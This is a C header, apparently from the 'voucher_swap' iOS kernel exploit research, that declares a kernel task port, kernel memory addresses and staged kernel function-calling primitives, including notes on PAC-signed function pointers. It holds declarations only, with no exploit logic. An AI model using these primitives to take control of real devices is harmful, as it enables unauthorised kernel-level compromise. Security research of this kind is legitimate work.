/*
 * kernel_call/user_client.h
 * Brandon Azad
 */
#ifndef VOUCHER_SWAP__KERNEL_CALL__USER_CLIENT_H_
#define VOUCHER_SWAP__KERNEL_CALL__USER_CLIENT_H_

#include <mach/mach.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/*
 * kernel_task_port
 *
 * Description:
 * 	The kernel task port.
 */
mach_port_t kernel_task_port;

/*
 * kernel_task
 *
 * Description:
 * 	The address of the kernel_task in kernel memory.
 */
uint64_t kernel_task;

/*
 * current_task
 *
 * Description:
 * 	The address of the current task in kernel memory.
 */
uint64_t current_task;

/*
 * kernel_ipc_port_lookup
 *
 * Description:
 * 	Get the address of the ipc_port and ipc_entry for a Mach port name.
 */
bool kernel_ipc_port_lookup(uint64_t task, mach_port_name_t port_name,
		uint64_t *ipc_port, uint64_t *ipc_entry);

/*
 * stage1_kernel_call_init
 *
 * Description:
 * 	Initialize stage 1 of kernel function calling.
 *
 * Initializes:
 * 	kernel_call_parameters_init()
 * 	stage1_kernel_call_7v()
 */
bool stage1_kernel_call_init(void);

/*
 * stage1_kernel_call_deinit
 *
 * Description:
 * 	Deinitialize stage 1 of kernel function calling.
 */
void stage1_kernel_call_deinit(void);

/*
 * stage1_get_kernel_buffer
 *
 * Description:
 * 	Get the address of a 0x1000-byte scratch space in kernel memory that can be used by other
 * 	stages.
 */
uint64_t stage1_get_kernel_buffer(void);

/*
 * stage1_kernel_call_7v
 *
 * Description:
 * 	Call a kernel function using our stage 1 execute primitive.
 *
 * Restrictions:
 * 	At most 7 arguments can be passed.
 * 	The return value is truncated to 32 bits.
 * 	At stage 1, only arguments X1 - X6 are controlled.
 * 	The function pointer must already have a PAC signature.
 */
uint32_t stage1_kernel_call_7v(uint64_t function,
		size_t argument_count, const uint64_t arguments[]);

/*
 * stage3_kernel_call_init
 *
 * Description:
 * 	Initialize stage 3 of kernel function calling.
 *
 * Initializes:
 * 	kernel_call_7v()
 */
bool stage3_kernel_call_init(void);

/*
 * stage3_kernel_call_deinit
 *
 * Description:
 * 	Deinitialize stage 3 of kernel function calling.
 */
void stage3_kernel_call_deinit(void);

#endif
